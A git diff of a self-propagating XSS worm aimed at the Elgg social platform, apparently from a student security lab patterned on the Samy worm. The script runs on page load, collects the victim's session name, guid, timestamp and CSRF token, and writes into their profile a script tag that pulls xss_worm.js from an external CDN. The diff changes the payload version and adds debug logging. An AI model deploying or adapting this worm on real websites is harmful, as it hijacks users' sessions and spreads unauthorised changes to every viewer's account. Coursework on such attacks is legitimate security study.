@@ -1,5 +1,6 @@
 <script type"text/javascript">
 window.onload = function(){
+console.log("0");
 	//JavaScript Code to access username, user guid, Time Stamp __elgg_ts
 	// and Security Token __elgg_token
 	var userName="&name="+elgg.session.user.name;
@@ -8,7 +9,7 @@ window.onload = function(){
   	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	console.log("1");
 	//Construct the content of your url.
-	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V6\/xss_worm.js\"\>\<\/script\>" + "&accesslevel[description]=2";
+	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V7\/xss_worm.js\"\>\<\/script\>" + "&accesslevel[description]=2";
 	console.log("2");
 	var content = ts + token + userName + description + guid;
 	var samyGuid = 59;
@@ -25,7 +26,7 @@ window.onload = function(){
 	}
 		console.log("3");
 }
-
+</script>
 
 
 
